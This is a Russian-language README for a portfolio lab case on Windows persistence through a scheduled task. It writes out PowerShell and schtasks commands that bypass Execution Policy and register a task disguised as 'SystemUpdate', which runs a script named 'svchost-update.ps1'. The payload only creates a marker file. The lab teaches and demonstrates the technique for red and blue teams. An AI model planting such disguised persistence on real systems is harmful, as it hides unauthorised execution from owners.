# Windows Scheduled Task Persistence (schtasks)

Практический кейс по закреплению в Windows через Scheduled Task (`schtasks`) с обходом PowerShell Execution Policy. 
Репозиторий показывает полную цепочку: подготовка PowerShell‑скрипта, создание задачи `SystemUpdate`, проверка выполнения и артефактов, а также Blue Team‑подход к поиску и удалению такой задачи. 

## Скриншот

<img src="screenshots/win_scheduled_task_persistence_systemupdate.png" width="900" alt="Windows Scheduled Task persistence case">

---

## Быстрый старт

1. Создать скрипт:

   ```powershell
   'New-Item -ItemType File -Path "C:\Windows\Tasks\svchost-update.out" -Force -ErrorAction SilentlyContinue' |
     Out-File -FilePath "C:\Windows\Tasks\svchost-update.ps1" -Encoding UTF8
   ```

2. Проверить вручную с обходом Execution Policy:

   ```powershell
   powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Windows\Tasks\svchost-update.ps1"
   Test-Path "C:\Windows\Tasks\svchost-update.out"
   ```

3. Создать задачу:

   ```powershell
   schtasks /Create /TN "SystemUpdate" /SC ONCE /ST 23:59 /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Tasks\svchost-update.ps1" /F
   ```

4. Запустить задачу и убедиться, что persistence сработал:

   ```powershell
   schtasks /Run /TN "SystemUpdate"
   Start-Sleep -Seconds 10
   Test-Path "C:\Windows\Tasks\svchost-update.out"
   ```

---

## Структура проекта

- `scripts/svchost-update.ps1` — payload, создающий артефакт `svchost-update.out`.
- `docs/overview.md` — описание кейса, Red Team и Blue Team‑заметки.
- `screenshots/` — скриншоты с настройкой и результатами.

---

## Связанные работы

Другие мои кейсы по DFIR / Blue Team / Red Team:

- [powershell-shellcode-case](https://github.com/Ivan-qa-rgb/powershell-shellcode-case)
- [track-forensics-incident](https://github.com/Ivan-qa-rgb/track-forensics-incident)
- [incident-reports-ad-wmi-lateral-movement](https://github.com/Ivan-qa-rgb/incident-reports-ad-wmi-lateral-movement.md)
- Портфолио‑сайт: https://ivan-qa-rgb.github.io/cybersecurity-resume/
